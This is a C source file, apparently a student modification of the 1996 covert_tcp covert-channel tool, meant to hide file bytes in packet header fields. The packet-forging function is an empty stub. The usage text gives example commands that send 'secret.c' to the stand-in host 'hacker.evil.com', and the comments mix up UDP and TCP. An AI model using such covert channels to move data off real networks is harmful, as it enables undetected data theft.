/*---------------------------------------------------------------------------------------
 * SOURCE FILE:	    covert_udp
 * 
 * PROGRAM:		    covert_udp
 * 
 * FUNCTIONS:		void forgepacket(unsigned int, unsigned int, unsigned short, unsigned short, char *, int, int, int, int);
 *                  unsigned short in_cksum(unsigned short *, int);
 *                  unsigned int host_convert(char *);
 *                  void usage(char *);
 * 
 * DATE:			September 20, 2021
 * 
 * REVISIONS:		NA
 * 
 * DESIGNERS:       Nicole Jingco
 * 
 * PROGRAMMERS:		Nicole Jingco
 * 
 * Notes:
 * This application is a modification of the Craig H. Rowland TCP Covert Channel. This 
 * program modifies the UDP header to transfer a file one byte at a time  to the destination
 * host consealing the data in the port number. This program acts as both a server and 
 * client.
 * ---------------------------------------------------------------------------------------*/
#include "covert_udp.h"

/*--------------------------------------------------------------------------
 * FUNCTION:        main
 *
 * DATE:           NA
 *
 * REVISIONS:      NA
 * 
 * DESIGNER:       Craig H. Rowland
 *
 * PROGRAMMER:     Craig H. Rowland
 *
 * INTERFACE:      int argc, char **argv
 *
 * RETURNS:        
 *
 * NOTES:
 * This is the main function
 * -----------------------------------------------------------------------*/
main(int argc, char **argv)
{
    unsigned int source_host = 0, dest_host = 0;
    unsigned short source_port = 0, dest_port = 80;
    int ipid = 0, seq = 0, ack = 0, server = 0, file = 0;
    int count;
    char desthost[80], srchost[80], filename[80];

    /* Title */
    printf("Covert TCP %s (c)1996 Craig H. Rowland (crowland@psionic.com)\n", VERSION);
    printf("Not for commercial use without permission.\n");

    /* Can they run this? */
    if (geteuid() != 0)
    {
        printf("\nYou need to be root to run this.\n\n");
        exit(0);
    }

    /* Tell them how to use this thing */
    if ((argc < 6) || (argc > 13))
    {
        usage(argv[0]);
        exit(0);
    }

    /* No error checking on the args...next version :) */
    for (count = 0; count < argc; ++count)
    {
        if (strcmp(argv[count], "-dest") == 0)
        {
            dest_host = host_convert(argv[count + 1]);
            strncpy(desthost, argv[count + 1], 79);
        }
        else if (strcmp(argv[count], "-source") == 0)
        {
            source_host = host_convert(argv[count + 1]);
            strncpy(srchost, argv[count + 1], 79);
        }
        else if (strcmp(argv[count], "-file") == 0)
        {
            strncpy(filename, argv[count + 1], 79);
            file = 1;
        }
        else if (strcmp(argv[count], "-source_port") == 0)
            source_port = atoi(argv[count + 1]);
        else if (strcmp(argv[count], "-dest_port") == 0)
            dest_port = atoi(argv[count + 1]);
        else if (strcmp(argv[count], "-ipid") == 0)
            ipid = 1;
        else if (strcmp(argv[count], "-seq") == 0)
            seq = 1;
        else if (strcmp(argv[count], "-ack") == 0)
            ack = 1;
        else if (strcmp(argv[count], "-server") == 0)
            server = 1;
    }

    /* check the encoding flags */
    if (ipid + seq + ack == 0)
        ipid = 1; /* set default encode type if none given */
    else if (ipid + seq + ack != 1)
    {
        printf("\n\nOnly one encoding/decode flag (-ipid -seq -ack) can be used at a time.\n\n");
        exit(1);
    }
    /* Did they give us a filename? */
    if (file != 1)
    {
        printf("\n\nYou need to supply a filename (-file <filename>)\n\n");
        exit(1);
    }

    if (server == 0) /* if they want to be a client do this... */
    {
        if (source_host == 0 && dest_host == 0)
        {
            printf("\n\nYou need to supply a source and destination address for client mode.\n\n");
            exit(1);
        }
        else if (ack == 1)
        {
            printf("\n\n-ack decoding can only be used in SERVER mode (-server)\n\n");
            exit(1);
        }
        else
        {
            printf("Destination Host: %s\n", desthost);
            printf("Source Host     : %s\n", srchost);
            if (source_port == 0)
                printf("Originating Port: random\n");
            else
                printf("Originating Port: %u\n", source_port);
            printf("Destination Port: %u\n", dest_port);
            printf("Encoded Filename: %s\n", filename);
            if (ipid == 1)
                printf("Encoding Type   : IP ID\n");
            else if (seq == 1)
                printf("Encoding Type   : IP Sequence Number\n");
            printf("\nClient Mode: Sending data.\n\n");
        }
    }
    else /* server mode it is */
    {
        if (source_host == 0 && source_port == 0)
        {
            printf("You need to supply a source address and/or source port for server mode.\n");
            exit(1);
        }
        if (dest_host == 0) /* if not host given, listen for anything.. */
            strcpy(desthost, "Any Host");
        if (source_host == 0)
            strcpy(srchost, "Any Host");
        printf("Listening for data from IP: %s\n", srchost);
        if (source_port == 0)
            printf("Listening for data bound for local port: Any Port\n");
        else
            printf("Listening for data bound for local port: %u\n", source_port);
        printf("Decoded Filename: %s\n", filename);
        if (ipid == 1)
            printf("Decoding Type Is: IP packet ID\n");
        else if (seq == 1)
            printf("Decoding Type Is: IP Sequence Number\n");
        else if (ack == 1)
            printf("Decoding Type Is: IP ACK field bounced packet.\n");
        printf("\nServer Mode: Listening for data.\n\n");
    }

    /* Do the dirty work */
    forgepacket(source_host, dest_host, source_port, dest_port, filename, server, ipid, seq, ack);
    exit(0);
}

/*--------------------------------------------------------------------------
 * FUNCTION:        forgepacket
 *
 * DATE:           NA
 *
 * REVISIONS:      NA
 * 
 * DESIGNER:       Nicole Jingco
 *
 * PROGRAMMER:     Nicole Jingco
 *
 * INTERFACE:      unsigned int, unsigned int, unsigned short, unsigned short, char *, int, int, int, int
 *
 * RETURNS:        
 *
 * NOTES:
 * 
 * -----------------------------------------------------------------------*/
void forgepacket(unsigned int, unsigned int, unsigned short, unsigned short, char *, int, int, int, int)
{

    fprintf(stdout, "\nforge packets");
}

/*--------------------------------------------------------------------------
 * FUNCTION:       in_cksum
 *
 * DATE:           NA
 *
 * REVISIONS:      NA
 * 
 * DESIGNER:       Craig H. Rowland
 *
 * PROGRAMMER:     Craig H. Rowland
 *
 * INTERFACE:      unsigned short *ptr, int nbytes
 *
 * RETURNS:        
 *
 * NOTES:
 * This is the main file that takes the user input then continues to the
 * read file
 * -----------------------------------------------------------------------*/
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
    register long sum; /* assumes long == 32 bits */
    u_short oddbyte;
    register u_short answer; /* assumes u_short == 16 bits */

    /*
	 * Our algorithm is simple, using a 32-bit accumulator (sum),
	 * we add sequential 16-bit words to it, and at the end, fold back
	 * all the carry bits from the top 16 bits into the lower 16 bits.
	 */

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }

    /* mop up an odd byte, if necessary */
    if (nbytes == 1)
    {
        oddbyte = 0;                            /* make sure top half is zero */
        *((u_char *)&oddbyte) = *(u_char *)ptr; /* one byte only */
        sum += oddbyte;
    }

    /*
	 * Add back carry outs from top 16 bits to low 16 bits.
	 */

    sum = (sum >> 16) + (sum & 0xffff); /* add high-16 to low-16 */
    sum += (sum >> 16);                 /* add carry */
    answer = ~sum;                      /* ones-complement, then truncate to 16 bits */
    return (answer);
}

/*--------------------------------------------------------------------------
 * FUNCTION:       host_convert
 *
 * DATE:           NA
 *
 * REVISIONS:      NA
 * 
 * DESIGNER:       Craig H. Rowland
 *
 * PROGRAMMER:     Craig H. Rowland
 *
 * INTERFACE:      char *hostname
 *
 * RETURNS:        
 *
 * NOTES:
 * This is the main file that takes the user input then continues to the
 * read file
 * -----------------------------------------------------------------------*/
unsigned int host_convert(char *hostname)
{
    static struct in_addr i;
    struct hostent *h;
    i.s_addr = inet_addr(hostname);
    if (i.s_addr == -1)
    {
        h = gethostbyname(hostname);
        if (h == NULL)
        {
            fprintf(stderr, "cannot resolve %s\n", hostname);
            exit(0);
        }
        bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
    }
    return i.s_addr;
}

/*--------------------------------------------------------------------------
 * FUNCTION:        usage
 *
 * DATE:           NA
 *
 * REVISIONS:      NA
 * 
 * DESIGNER:       Craig H. Rowland
 *
 * PROGRAMMER:     Craig H. Rowland
 *
 * INTERFACE:      char *progname
 *
 * RETURNS:        
 *
 * NOTES:
 * This is the main file that takes the user input then continues to the
 * read file
 * -----------------------------------------------------------------------*/
void usage(char *progname)
{
    printf("Covert TCP usage: \n%s -dest dest_ip -source source_ip -file filename -source_port port -dest_port port -server [encode type]\n\n", progname);
    printf("-dest dest_ip      - Host to send data to.\n");
    printf("-source source_ip  - Host where you want the data to originate from.\n");
    printf("                     In SERVER mode this is the host data will\n");
    printf("                     be coming FROM.\n");
    printf("-source_port port  - IP source port you want data to appear from. \n");
    printf("                     (randomly set by default)\n");
    printf("-dest_port port    - IP source port you want data to go to. In\n");
    printf("                     SERVER mode this is the port data will be coming\n");
    printf("                     inbound on. Port 80 by default.\n");
    printf("-file filename     - Name of the file to encode and transfer.\n");
    printf("-server            - Passive mode to allow receiving of data.\n");
    printf("[Encode Type] - Optional encoding type\n");
    printf("-ipid - Encode data a byte at a time in the IP packet ID. [DEFAULT]\n");
    printf("-seq  - Encode data a byte at a time in the packet sequence number.\n");
    printf("-ack  - DECODE data a byte at a time from the ACK field.\n");
    printf("        This ONLY works from server mode and is made to decode\n");
    printf("        covert channel packets that have been bounced off a remote\n");
    printf("        server using -seq. See documentation for details\n");
    printf("\nPress ENTER for examples.");
    getchar();
    printf("\nExample: \ncovert_tcp -dest foo.bar.com -source hacker.evil.com -source_port 1234 -dest_port 80 -file secret.c\n\n");
    printf("Above sends the file secret.c to the host hacker.evil.com a byte \n");
    printf("at a time using the default IP packet ID encoding.\n");
    printf("\nExample: \ncovert_tcp -dest foo.bar.com -source hacker.evil.com -dest_port 80 -server -file secret.c\n\n");
    printf("Above listens passively for packets from  hacker.evil.com\n");
    printf("destined for port 80. It takes the data and saves the file locally\n");
    printf("as secret.c\n\n");
    exit(0);
}